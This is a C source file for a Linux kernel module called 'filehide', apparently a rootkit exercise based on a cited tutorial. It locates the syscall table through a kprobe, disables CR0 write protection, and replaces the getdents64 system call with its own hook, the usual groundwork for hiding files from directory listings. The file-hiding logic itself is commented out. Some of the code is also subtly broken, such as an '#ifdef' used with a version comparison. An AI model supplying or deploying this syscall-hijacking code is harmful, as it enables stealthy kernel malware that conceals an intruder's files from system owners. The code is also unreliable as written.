#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/dirent.h>

// https://xcellerator.github.io/posts/linux_rootkits_11/
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
#define KPROBE_LOOKUP 1
#include <linux/kprobes.h>
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};
#endif

// from linux/syscalls.h
typedef asmlinkage long (*sys_getdents64_t) (unsigned int fd,
				struct linux_dirent64 __user *dirent,
				unsigned int count);
sys_getdents64_t sys_getdents64;

static asmlinkage long filehide_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
	//pr_info("getdents %d\n", fd);
	long len = sys_getdents64(fd, dirent, count);

	// struct linux_dirent64* cur = dirent;

	// int i = 0;
	// while(i < len)
	// {
	// 	if (strncmp(cur->d_name, "foo", strlen(cur->d_name)) == 0) {
	// 		//struct linux_dirent64* next = *(cur + cur->d_reclen);
	// 		memcpy((char*) cur->d_name, "bar", 3);
	// 	}
	// }

	return len;
}

/**
 * Because the kernels version prevents us from messing with WP
*/
inline void cr0_write(unsigned long cr0)
{
    asm volatile("mov %0,%%cr0" : "+r"(cr0));
}

unsigned long *__sys_call_table;

static int init(void)
{
	pr_info("filehide initializing.\n");
	#ifdef LINUX_VERSION_CODE >= KERNEL_VERSION(5,7,0)
	
    /* typedef for kallsyms_lookup_name() so we can easily cast kp.addr */
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name;

    /* register the kprobe */
    register_kprobe(&kp);

	pr_info("Found kallsyms_lookup_name at %lx\n", (unsigned long) kp.addr);

    /* assign kallsyms_lookup_name symbol to kp.addr */
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;

    /* done with the kprobe, so unregister it */
    unregister_kprobe(&kp);
	#endif

	// Get the sys_call_table
	__sys_call_table = (unsigned long*) kallsyms_lookup_name("sys_call_table");

	pr_info("Found sys_call_table at %lx\n", (unsigned long) __sys_call_table);

	sys_getdents64 = (sys_getdents64_t) __sys_call_table[__NR_getdents64];
	pr_info("Real getdents64 at %lx\n", (unsigned long) sys_getdents64);
	pr_info("Entry in table:  %lx\n", (unsigned long) &(__sys_call_table[__NR_getdents64]));
	pr_info("My getdents64 at %lx\n", (unsigned long) filehide_getdents64);

	// The easiest way to be able to write into the sys_call
	// is to just unset the WP bit on cr0
	// You can also alter the permissions on the page containing the table
	pr_info("Disabling WP on CR0.\n");
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
	pr_info("New CR0: %lx", read_cr0());
	pr_info("Hooking...");
	__sys_call_table[__NR_getdents64] = (unsigned long) filehide_getdents64;
	set_bit(16, &cr0);
	cr0_write(cr0);
	
	pr_info("filehide initialized.\n");
	return 0;
}

static void cleanup(void)
{
	pr_info("Ressetting the syscall table.\n");
	unsigned long cr0 = read_cr0();
	clear_bit(16, &cr0);
	cr0_write(cr0);
	__sys_call_table[__NR_getdents64] = (unsigned long) sys_getdents64;
	set_bit(16, &cr0);
	cr0_write(cr0);

	pr_info("filehide exited.\n");
}

module_init(init);
module_exit(cleanup);
MODULE_LICENSE("GPL");
